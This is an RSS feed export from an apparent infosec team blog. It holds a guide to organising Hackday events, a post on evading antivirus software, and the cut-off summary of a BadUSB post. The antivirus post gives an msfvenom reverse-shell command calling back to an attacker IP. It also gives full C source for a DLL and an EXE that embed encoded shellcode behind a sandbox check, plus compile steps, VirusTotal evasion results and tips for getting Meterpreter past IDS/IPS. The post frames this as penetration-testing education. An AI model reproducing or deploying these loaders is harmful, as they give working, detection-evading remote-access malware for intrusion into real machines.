@@ -1,0 +1,567 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>jvesiluoma &#8211; Team ROT Information Security</title>
+	<atom:link href="/author/jvesiluoma/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>Team ROT Information Security</description>
+	<lastBuildDate>Sat, 29 Aug 2020 10:50:44 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+
+<image>
+	<url>/wp-content/uploads/2020/08/cropped-ROT2-WHITE-BG.eps_-2-32x32.png</url>
+	<title>jvesiluoma &#8211; Team ROT Information Security</title>
+	<link>/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>How to create an awesome Hackday event</title>
+		<link>/how-to-create-an-awesome-hackday-event/</link>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Mon, 20 May 2019 19:03:36 +0000</pubDate>
+				<category><![CDATA[Guide]]></category>
+		<category><![CDATA[Informative]]></category>
+		<guid isPermaLink="false">/?p=1550</guid>
+
+					<description><![CDATA[Hackday (not to be confused with ‘hackathon’ events) is a live event where a group or groups of hackers do security testing to some target (i.e. hack the target). Usually the target is a web application or for example some IoT device. The event may last from one day to a few days. It is common that the organizer will pay bounties for the security vulnerabilities reported by the participants. Organizer(s) can coax hackers to participate with some amazing swag, bounties or other prices that can be won in the event. Bigger the prices, the more hackers will want to join and more experienced hackers will be participating.
+
+
+
+
+The usual flow of the event will be; registering of participants, informational meetup to all, hacking and reporting of vulnerabilities, end meetup and some networking at the end.
+
+
+
+
+This document aims to guide organizers to create and amazing hacking event so everyone participating will have amazing time! Organizer will get the target tested for vulnerabilities and will get good PR from the event.]]></description>
+										<content:encoded><![CDATA[<h2><span style="font-weight: 400;">What is a Hackday?</span></h2>
+<p style="text-align: justify;"><span style="font-weight: 400;">Hackday (not to be confused with ‘hackathon’ events) is a live event where a group or groups of hackers do security testing to some target (i.e. hack the target). Usually the target is a web application or for example some IoT device. The event may last from one day to a few days. It is common that the organizer will pay bounties for the security vulnerabilities reported by the participants. Organizer(s) can coax hackers to participate with some amazing swag, bounties or other prices that can be won in the event. Bigger the prices, the more hackers will want to join and more experienced hackers will be participating.</span></p>
+<p style="text-align: justify;">
+<p style="text-align: justify;"><span style="font-weight: 400;">The usual flow of the event will be; registering of participants, informational meetup to all, hacking and reporting of vulnerabilities, end meetup and some networking at the end.</span></p>
+<p style="text-align: justify;">
+<p style="text-align: justify;"><span style="font-weight: 400;">This document aims to guide organizers to create and amazing hacking event so everyone participating will have amazing time! Organizer will get the target tested for vulnerabilities and will get good PR from the event.</span></p>
+<h2><span style="font-weight: 400;">Target(s)</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">If possible, use a testing/staging environment for the Hackday, with extended logging to catch more data in case errors occur (and to avoid causing trouble in Production).</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Permitting hackers to access the log data can help them to dig up issues that lie deep in the application.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Define the scope of the target in detail. This is hugely important for fair game and equal opportunity for all the teams. And also to safeguard production systems from being hammered.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Benchmark the system for heavy loads (e.g high amount of requests/queries). Testing can impact availability especially when multiple teams are trying to break it simultaneously.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">In some cases it can be beneficial to allow reconnaissance and testing prior to the event for more value from the event itself, at the risk of low volume of reports in the event itself.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Prepare user specific or at least team specific set of credentials for the target system. If the permission system is multi-tiered, create at least one user for each user role for each of the testers or teams. Two separate user accounts are necessary for testing certain issues.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Consider disabling or limiting the use of external security controls such as WAF (Web Application Firewalls) and/or IPS (Intrusion Prevention Systems). This allows the teams to spend time more efficiently on finding vulnerabilities rather than trying to bypass the controls, which can be bypassed by a motivated attacker in the production anyway.</span></li>
+</ul>
+<h2><span style="font-weight: 400;">Facilities</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Prepare a room for each of the teams. This will allow the testers to openly communicate about the application and potential vulnerabilities without having to worry about the competing team overhearing the strategy.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Connectivity options for wired and wireless networks in case one of the options is suffering poor availability.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Reserve some snacks, refreshing beverages and arrange a quick lunch/dinner depending on the length of the event.</span></li>
+</ul>
+<h2><span style="font-weight: 400;">Rewards</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">When announcing the event, include what kind of bounties will be available and if monetary, how much is reserved and how it will be paid out to the hackers. This will be the main attraction for many great hackers.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Explain how you’ll be paying the bounties, whether it is by vulnerability type or by points earned from reporting the vulnerabilities.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Preferably pay bounties based on business impact instead of vulnerability types. Bug Bounty programs are a great way to find the necessary details. </span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">If possible, reward each attending hacker/team regardless of their possible findings. This will help hackers cut their travel expenses and motivate them to to try harder next time. The reward can also be some kind of tech gift that is appealing to technically oriented people.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Prepare the </span><b>Swag!</b><span style="font-weight: 400;"> (great publicity for the company)</span>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Stickers/T-Shirts/Hoodies/Backpacks/other</span></li>
+</ul>
+</li>
+</ul>
+<h2><span style="font-weight: 400;">Acknowledgement</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Give warm thanks to your friendly neighborhood hackers. They spend hours travelling to your event to help you secure the target system and to challenge themselves while doing so.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Don’t underestimate the public “thank you!”. Praise the teams in social media (or other), they will be grateful for it!</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Decide if the best finding/most vulnerabilities/most severe/etc vulnerability will be awarded somehow. This could also increase competitiveness between groups and at least give positive feeling of appreciation to winning group / person.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Engage in one on one conversations with the participants to establish rapport.</span></li>
+</ul>
+<h2><span style="font-weight: 400;"></span></h2>
+<h2><span style="font-weight: 400;">Rules and Reporting</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Non-Disclosure Agreement (reasonable terms).</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Rules</span>
+<ul>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Define what happens if a group breaks the rules, e.g. going out-of-scope, disturb other groups, unethical behaviour in the event etc. </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Out-Of-Scope vulnerabilities should be accepted, but only as informational vulnerabilities in the event and without any points. More value for the money. </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Malicious intent should be defined in the agreement. </span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Rules, non-disclosure agreements etc. documentation should preferably be sent beforehand for the participants to read.</span></li>
+<li style="font-weight: 400;"><span style="font-weight: 400;">Remember to inform that participants can not share information about the vulnerabilities publicly (or they may lose the bounty for that vulnerability).</span></li>
+</ul>
+</li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">You should define what kind of vulnerability reports will </span><span style="font-weight: 400;">not</span><span style="font-weight: 400;"> be rewarded.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">When and how will bounties be paid.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Ask for consent before unleashing your media team on hackers for surprise photoshoots.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Allow teams to see reported vulnerabilities (at least the subject of each report) so hackers know not to spend time on duplicate vulnerabilities that will be disqualified.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Explain what is and what isn’t a duplicate report to avoid confusion.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Require a definition of impact and a working POC (Proof of Concept) for each reported vulnerability so that the issue is easily reproduced.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Consider if you want to ban or limit the use of automated scanners. They can help find vulnerabilities but can also negatively affect the system and event by generating excessive amount of traffic.</span></li>
+<li>Inform teams that all confidential material such as vulnerability details should be removed from hacker&#8217;s devices before leaving the event.</li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Be prepared to make judgement and decisions swiftly on the spot. Have a clear jury/judge who can make decisions.</span></li>
+</ul>
+<h2><span style="font-weight: 400;">Schedule</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Time used to test the target application will of course affect the test coverage. In general, minimum of eight (8) hours should be reserved for testing.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">At the start of the event, go through the rules and specify what is in scope.</span></li>
+</ul>
+<h2><span style="font-weight: 400;"></span></h2>
+<h2><span style="font-weight: 400;">Other</span></h2>
+<ul>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Identify (drivers license or other) each attending hacker.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Collect bank account details (if applies) for bounty payments.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Prepare a reporting platform for handling vulnerability reports.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Consider allowing internet access to hackers so they can access more resources (e.g ad-hoc research).</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">It is recommended to have technically inclined staff (developers) and a product owner on site to answer questions and help the jury evaluating vulnerability impact.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">The event must have jury which will decide and evaluate severity and impact of each vulnerability and the possible bounty sum.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">Assist students and/or newbies by guiding them and getting them to know “seniors”. Attract more experienced hackers to teach the juniors with some small reward.</span></li>
+<li style="font-weight: 400; text-align: justify;"><span style="font-weight: 400;">When the event ends, kill the connections to the target, this way you can be sure that no one tests anymore.</span></li>
+</ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Evading Antivirus softwares</title>
+		<link>/evading-antivirus-softwares/</link>
+					<comments>/evading-antivirus-softwares/#respond</comments>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Tue, 18 Apr 2017 19:38:10 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=717</guid>
+
+					<description><![CDATA[As the CIA Wikileaks articles mention, antivirus softwares can be bypassed pretty easily. Althought this article is primarily for penetration testing purposes, it also reweals how easy it is to circumvent antivirus softwares and restrictions.
+This article should show some ideas about how hackers work.]]></description>
+										<content:encoded><![CDATA[<h1 style="text-align: center;">Evading Antivirus softwares</h1>
+<p><a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/useless-image-that-doesnt-tell-anything-lol.jpg"><img decoding="async" class="size-full wp-image-786 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/useless-image-that-doesnt-tell-anything-lol.jpg" alt="" width="668" height="193"></a></p>
+<h2></h2>
+<h2>0x00 General</h2>
+<p>Foreword: As the CIA Wikileaks articles mention, antivirus softwares can be bypassed pretty easily. Althought this article is primarily for penetration testing purposes, it also reweals how easy it is to circumvent antivirus softwares and restrictions.<br />
+This article should show some ideas about how hackers work. Althought I found this myself, there is identical tutorials in the internet and mostly because of that, I&#8217;m writing this. This article covers some basics that are used to bypass the antivirus softwares, but by no means doesn’t cover all means to bypass them. Note: As this is an example, some methods are not as polished as they could be.<br />
+Sometimes in penetration testing you may end up with a situation where antivirus software always catches up your payloads. In these cases you need a good way to bypass the antivirus softwares. The method described here is a pretty general, but works with pretty much every antivirus there is.<br />
+Method to bypass antivirus detection mentioned here is reported to one antivirus company on February 2016, but from their view, this is more of an undetected malware. As the basic payload is done with msfvenom, one could argue if the payload / method should be detectable by an AV.<br />
+The method bypassing antivirus software also evades the sandboxing method. Evasion is as simple as trying to open some file that is sure to exist on every installation, e.g. “<em>c:\windows\system.ini</em>” &#8211; file. If it doesn’t exist, we’re in a sandboxing environment done by antivirus software so we just don’t do anything. When again in a normal environment, file is found and payload is executed.<br />
+By&nbsp; sending this method to Virustotal.com, detection rate was 1/59. Virustotal.com is a site, where the service checks the sended file against many antivirus engines. Also, by sending the file there, the antivirus companies get the file as a sample.<br />
+Software used:</p>
+<ul>
+<li>Metasploit (msfvenom, multi/handler)</li>
+<li>MinGW</li>
+<li>Notepad</li>
+</ul>
+<h2>0x01 Restrictions / limitations</h2>
+<p>It should be noted that the Windows Defender and probably most antivirus softwares nowdays complain about &#8220;some program is trying to connect to internet&#8221;. Of course, in penetration testing situation, this can be a showstopper. Nonetheless, if you manage to get a shell by changing the .dll of some software and/or tricking the user to run the executable, you may easily get a shell from the victim. And it&#8217;s possible to migrate the shellcode to some existing process that already has the access to internet, use&nbsp;existing programs to run malicious code to bypass whitelisting restrictions. There is many available methods to avoid the restrictions.<br />
+Of course, there could be some Firewalls/IPS/IDS systems in victims network, but they could also be easily avoided by e.g. using SSL encoded connection back to victim, but that’s another matter and not in scope of this article.<br />
+<strong>&nbsp;</strong></p>
+<h2>0x02 Setting up the payload</h2>
+<p>The payload was generated with ‘<em>msfvenom</em>’ that is part of the Metasploit package. With msfvenom, it’s possible to create executables and dll – files straight out of the box, but since we’re trying to evade the&nbsp; antivirus, we create the payload in C-style output format with the following command:</p>
+<pre>msfvenom -p windows/shell/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c</pre>
+<p>As can be seen, we are also encoding the payload five times with <em>x86/shikata_ga_nai</em> – encoder, port is <em>4321</em> and destination for payload to contact is <em>10.0.0.8</em>. Our payload is now ready to be used for testing in our code. To bypass IDS/IPS systems, payload using encrypted communications back to attacker could be used. This way even the more advanced firewalls could be bypassed since they can’t decrypt the connection.<br />
+<strong>&nbsp;</strong></p>
+<h2>0x03 DLL Method</h2>
+<p>One method to bypass antivirus softwares can be e.g. to create a malicious .dll – file and replace some existing .dll with it by a number of methods. As usually .exe – files are considered dangerous, users normally don’t recognize .dll – files as malicious. For testing purposes, this code snippet is just a very crude .dll – file that can be run from command line and doesn’t have any other functionality.</p>
+<pre>#include
+#include
+#ifdef EXPORTING_DLL
+  extern __declspec(dllexport) void Checksandboxing() ;
+#else
+  extern __declspec(dllimport) void Checksandboxing() ;
+#endif
+extern "C" BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpvReserved
+) {
+switch(fdwReason) {
+    case DLL_PROCESS_ATTACH:
+         CheckSandboxing();
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    default:
+        break;
+    }
+return TRUE;
+}
+void CheckSandboxing()
+{
+  /** Test for some existing system file, sandbox evasion **/
+  std::ifstream dllfile("c:\\windows\\system.ini", std::ios::binary);
+  if (!dllfile)
+  {
+       MessageBox( NULL, TEXT("Running in sandbox"), TEXT("Sandbox"), MB_OK);
+  }
+  else
+  {
+       MessageBox( NULL, TEXT("Real system, running exploit"), TEXT("Real"), MB_OK);
+    /** msfvenom -p windows/shell/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c  **/
+    unsigned char shellcode[] =
+    "\xbd\xf8\x13\x49\xa2\xda\xcf\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
+    "\x6f\x83\xc2\x04\x31\x6a\x0f\x03\x6a\xf7\xf1\xbc\x19\x44\xae"
+    "\x68\x86\x91\x90\x4c\x42\x01\xd9\x32\x82\x80\x90\xa5\xe5\x4f"
+    "\xc7\x36\x5b\x7b\x64\xfd\x67\x22\xc7\x73\x73\xbb\xf3\x22\x3e"
+    "\x09\x29\x81\x17\x8d\xb9\x87\x1f\xd4\x8c\x23\xc9\x65\x07\xc9"
+    "\xc0\xd9\x46\x6d\xe3\xff\x34\x31\x74\xa7\x67\xec\x23\xb4\x53"
+    "\x83\x31\xbe\x71\xda\x48\x30\x28\x16\x1e\xb9\x5e\x50\xa5\xf0"
+    "\xe7\x80\x07\x07\x04\x91\xab\xfc\x2b\xd1\x74\xcd\x3d\x11\x7e"
+    "\x77\xf5\x4b\xd4\x6a\x9f\x2d\xec\x28\x72\xd6\xa7\x87\x56\x97"
+    "\x89\xe1\x2b\x46\x72\x04\x56\x23\xd2\x17\x96\x62\x85\x7c\xd0"
+    "\x9e\xe8\x24\x92\x59\x3f\x58\x3e\xf4\x66\xf0\xdf\x56\xf0\xf0"
+    "\x72\x96\x21\xae\xb7\x9c\x26\x33\x7d\x11\xec\x14\x44\x0c\xb9"
+    "\x0d\x50\xca\xb6\xf6\xb3\xab\xd7\x93\x6d\xfb\xe9\x20\x6b\x0f"
+    "\xf4\xda\x61\xb3\xed\x40\xf9\xea\xcc\xba\xd4\x92\xbe\x15\x11"
+    "\xe4\xba\x22\xdc\x43\xb7\x15\xeb\x5d\x45\x79\x41\xa5\x25\xe7"
+    "\x8e\xa2\x8e\x97\x7d\xae\xf4\x1e\x50\x22\x4c\xb7\xfc\x08\x21"
+    "\xed\xb4\x1d\xde\xff\x1a\x7a\x37\x98\xa3\xcd\x47\xfa\x10\x1a"
+    "\xff\x57\x52\x6c\xff\x39\x92\xe6\x53\x05\x67\xd9\xcf\x51\x01"
+    "\x4f\x0c\x18\x66\x81\x4a\x02\x2d\x79\xe5\x0c\x80\xe3\xe4\xce"
+    "\x61\x18\xc2\x9c\xc8\xe5\xda\x31\xad\x2b\x63\xe3\xae\xf2\x81"
+    "\xd0\x0d\x26\xd9\xe5\x64\x73\x8a\x70\x71\x2f\x88\x4c\x72\xba"
+    "\xef\xd5\x26\x39\x2c\x42\xe6\xd9\x93\xb7\x69\xd9\x49\xcd\x72"
+    "\x10\x52\x1e\x76\x11\xb5\xa9\x6c\xc7\x45\xcc\xa9\xf0\x83\x75"
+    "\xa7\x85\xcb\x34\x0a\x50\x1d\xf5\xe5\x6c\xbc\x88\xda\xe1\x0f"
+    "\xa9\xe8\xe8\xf0\xc4\x1e\x83\xa1\xdf\xad\xaa\x9f\x1d\xa7\x82"
+    "\x71\x6c\xbd\x8b\x02\x6d\x54\xf7\x42\xae\x68\x24\x9f\xf8\x73"
+    "\xb9\x8a\x67\xa6\xef\x32\xdf\x21\xf2\x9a\xea\x10\xc6\x19\xcf"
+    "\x11\x55\x61\xfc\xfe\xf1\x51\x49\xbc\x04\x9f\xe0\x9a\x09\x4e"
+    "\x19\x2f\xb1\x20\x76\xac\x90\x3d\x48\x2b\x24\x23\xa6\xa1\x2e"
+    "\x85\x35\xf7\x47\x8f\x49\xa3\xa0\x7a\x65\x22\x17\x5d\x72\x31"
+    "\xb3\x2e\x38\xdf\xe7\xea\x83\xdd\xdf\xdd\x9c\xdb\x5a\x46\x4d"
+    "\xd3\xa0\x31";
+    LPVOID lpAlloc = NULL;
+    void (*shellfunc)();
+    /** Allocate memory for shellcode (read,write,execute) **/
+    lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if(lpAlloc == NULL)
+    {
+        printf("Error allocating memory!\n");
+    }
+    else
+    {
+        memcpy(lpAlloc, shellcode, lstrlenA((LPCSTR)shellcode)+1);
+        shellfunc = (void (*)())lpAlloc;
+        shellfunc();
+    }
+    /** Sleep for a bit **/
+    Sleep(500);
+  }
+}
+</pre>
+<p>Compilation of the .dll is done as follows with MinGW</p>
+<pre>"c:\MinGW\bin\mingw32-g++.exe" -c c:\dll_test\main.cpp
+"c:\MinGW\bin\mingw32-g++.exe" -shared -o exploittest.dll main.o -Wl,--out-implib,libexample_dll.a
+</pre>
+<p>Now the .dll can be checked with antivirus software, checking with Virustotal.com:<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-dll.png"><img decoding="async" class="size-full wp-image-795 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-dll.png" alt="" width="960" height="273"></a><br />
+Not detected by any (0/60) antivirus software at virustotal.com.<br />
+Now, to test the exploit, we first would setup a meterpreter multi/handler to wait for the connection:<br />
+And now we can run the payload from the exploit with following command on the command line:</p>
+<pre>Rundll32 exploittest.dll,@DllMain
+</pre>
+<p>What happens next, is Windows Defender or antivirus software will popup a question that ‘<em>exploittest.dll wants to connect to internet…</em>’, if it is accepted, shellcode inside .dll connects back to the attacker and shell is now made! Of course, in real situation this is a showstopper, but shell isn’t the only thing that can be placed inside the .dll – file.</p>
+<h2>0x04 Executables</h2>
+<p>As with the .dll – file, sandbox evasion is done by first checking for some existing system file. If file is found, code execution is moved to the payload.<br />
+Code:</p>
+<pre>#include
+// msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.0.8 lport=4321 -e x86/shikata_ga_nai -i 5 -f c
+char code[] =
+"\xdb\xda\xd9\x74\x24\xf4\x5e\x33\xc9\xb8\xcd\x9f\x5f\xe9\xb1"
+"\x6f\x31\x46\x18\x83\xee\xfc\x03\x46\xd9\x7d\xaa\x34\x23\x58"
+"\x21\xe3\x57\x06\x74\x2d\xf6\x97\x42\x9b\x31\x56\x3a\xed\xb4"
+"\x80\x38\xc8\x32\xb0\x4b\xc6\x1e\x22\x25\xdb\xc1\xd8\x32\x06"
+"\xc8\x19\x31\x8f\x0f\x09\x7c\xf8\x63\x78\x9d\x37\x00\x37\x86"
+"\x02\xf6\x63\xe6\x8b\xfc\xc1\xba\x1a\x88\x74\x60\xed\xc0\xad"
+"\x2a\x5b\xf2\xd3\x80\x19\xa9\x0e\x2e\x0c\x88\x36\xcf\xdb\x27"
+"\x84\x06\xbf\x25\x91\x64\x09\x1d\xf1\x19\x2f\xd6\xa2\x6d\x6d"
+"\x2a\x4e\xeb\xa4\x00\x91\x35\x57\x28\xbd\xd6\x10\x13\xad\x5d"
+"\xea\x23\x25\x9d\x14\x11\xc5\x8e\x8e\x46\x7b\x28\xe1\x3b\xf3"
+"\xd2\x4e\x39\xf0\x5d\x4a\xce\x64\xa7\x82\xc2\x7f\x72\x34\x96"
+"\xb4\xf9\x8d\xfe\x94\x11\x37\x88\xc3\xd7\xcb\xb5\x37\xb3\x1c"
+"\xc2\x58\xcc\x08\x37\x35\xea\x67\xff\x97\x01\x92\xf8\x33\x82"
+"\x5d\x3e\x48\xff\xe3\x96\x75\x18\x95\xcf\xc4\x07\xe5\xa4\x73"
+"\x38\xd4\x21\xe1\xb4\x96\x40\x52\x76\xdf\xe1\x60\x2c\xaf\x5d"
+"\xb3\xe4\xff\x89\x6b\x49\x3e\x7e\x2d\x0b\x33\xa0\x54\x8d\x9b"
+"\x40\x5b\x2e\xfe\x62\x1f\x48\x21\x69\x6e\x99\x08\xc2\xc2\xc3"
+"\x69\x53\x3f\x84\x8e\x79\xdb\xca\xeb\x3f\xcf\xd8\x8c\xf8\x0a"
+"\xed\x59\xcb\x6e\x82\xb4\x07\x00\xc3\x13\xed\x2e\x67\xf5\xc8"
+"\xfd\x1c\x24\x6a\x95\x3d\x90\x43\x29\xba\x29\xff\x22\x2b\x48"
+"\xa7\x7d\xb0\x3d\x56\x71\x30\x95\xdd\x69\x51\x2e\x0f\x3d\x5d"
+"\x19\xbd\xfa\x06\xf9\x02\xfd\xed\x08\x27\xb8\x21\x11\xd7\xc4"
+"\xd5\xca\xbb\x2a\xd4\xe7\x64\x65\x81\x50\x7b\xbd\xbd\xcb\xc0"
+"\x15\x05\xff\x78\xee\x8b\x38\x2b\x28\x52\x56\xb2\x49\xc4\x44"
+"\x39\xba\x76\x84\xeb\x0d\xa4\x53\x38\x4e\x77\x05\xc4\xa7\x94"
+"\xd4\xe9\xbf\x1d\xb7\xc1\x6f\x5f\xa6\x62\xe4\x91\x48\x3c\xd4"
+"\x6e\xce\xf1\x5f\xfd\x6c\x52\x8c\x59\x5c\x71\x63\x30\x81\x2e"
+"\x63\x6f\xbc\x43\x0b\xab\x37\xdb\xbf\x48\x22\xda\xdb\x3d\x04"
+"\xab\x5b\x6e\xfd\x3e\xfb\xfe\xb8\x4b\xa8\x72\xeb\x71\xbb\x0a"
+"\xeb\xb2\x56\xcb\xb9\x14\xcf\x7a\xa5\xc3\x5d\x34\x4f\xfa\x55"
+"\x54\x9d\x10\xe5\x26\xbc\x61\x56\xc7\x79\x8d\x64\x7a\x06\x50"
+"\x07\xdd\xc6";
+int main(int argc, char **argv)
+{
+  FILE *fp = fopen("c:\\windows\\system.ini", "rb");
+  if (fp == NULL)
+  return 0;
+  fclose(fp);
+  printf("Launching...again...");
+  int (*func)();
+  func = (int (*)()) code;
+  return 0;
+  (int)(*func)();
+  printf("...DONE!");
+}
+</pre>
+<p>Compilation is done simply by issuing:</p>
+<pre>c:\MinGW\bin\mingw32-gcc.exe exploittest.c -o exploittest.exe
+</pre>
+<p>Afterwards checking with virustotal.com, only <em>Baidu</em> noticed that it is a Trojan. Note to myself: Have to check why Baidu finds this.<br />
+<a href="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-exe.png"><img decoding="async" class="size-full wp-image-796 aligncenter" src="https://www.vesiluoma.com/wp-content/uploads/2017/03/virustotal-exe.png" alt="" width="966" height="413"></a><br />
+To test this, a multi/handler could be setup as in <strong>x03 DLL Method</strong> (note, different payload) and by simply executing the file. Same nagging from Windows defender and/or antivirus software apply to this also.</p>
+<h2>0x05 Malicious payloads through IPS / IDS systems</h2>
+<p>In case there is IPS / IDS systems in front of the victim, these files should pass right through them, but they payloads would get caught. If actual files would get caught, just create a password protected .zip – file and get the files through HTTP for example. So, something like <em>windows/meterpreter/reverse_https</em> could be used as payload with following changes to parameters:</p>
+<ul>
+<li>EnableStageEncoding true</li>
+<li>MeterpreterServerName Nginx</li>
+<li>MeterpreterUserAgent Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36</li>
+<li>StageEncoder (one of the below)
+<ul>
+<li>x86/fnstenv_mov</li>
+<li>x86/shikata_ga_nai</li>
+</ul>
+</li>
+</ul>
+<p>With these changes, it’s possible to walk through the firewalls with IPS/IDS systems enabled. One thing I noticed with one major firewall manufacturer is that it blocks SSL encrypted payloads, but after fiddling with ‘<em>stdapi_sys_process_execute</em>’ – string, the shell goes through, but issues ‘<em>critical</em>’ – state in the lofugs. As I went through the firewall, I didn’t research it more. I would wager that it is very well possible to completely hide from the firewall.<br />
+Of course, if all else fails, there is always the dnscat… <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f609.png" alt="😉" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
+<strong>&nbsp;</strong></p>
+<h2>0x06 Conclusion</h2>
+<p>Since victim would get an exploit/Trojan that is undetected by antivirus softwares, the possibility of exploiting unsuspecting user is greatly enhanced. Of course Windows Defender and antivirus have restrictions against new connections, but sadly these messages are ignored very often. But since antivirus doesn’t find anything, it is safe yes? No. Much of the security is still on the shoulders of users and antivirus / firewalls / IPS / IDS can’t be trusted to be bulletproof.<br />
+These methods could be further developed to do more evasive actions, sleep for a time, write other programs, etc. etc. This article was all about getting a shell from the client, but payload could be e.g. something more malicious. So, be sure not to count on the security software you use, have a common sense. Have a multiple layers of defense to enhance your security.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/evading-antivirus-softwares/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploiting with BadUSB/Digispark + meterpreter payload</title>
+		<link>/exploiting-with-badusbdigispark-meterpreter-payload/</link>
+					<comments>/exploiting-with-badusbdigispark-meterpreter-payload/#respond</comments>
+		
+		<dc:creator><![CDATA[jvesiluoma]]></dc:creator>
+		<pubDate>Wed, 22 Mar 2017 11:13:35 +0000</pubDate>
+				<category><![CDATA[Exploitation]]></category>
+		<category><![CDATA[Guide]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[badusb]]></category>
+		<category><![CDATA[digispark]]></category>
+		<category><![CDATA[digistump]]></category>
+		<category><![CDATA[keyboard]]></category>
+		<category><![CDATA[meterpreter]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=712</guid>
+
+					<description><![CDATA[Here is a small guide on how to create a BadUSB - stick with a meterpreter payload to Linux. BadUSB can be a normal USB memory stick with a customized firmware that'll have the computer to recognize the device as a keyboard. Because of this, the computer thinks that there's always a user typing on the keyboard, which is a pretty nasty exploit and enables a lot of possibilities.]]></description>
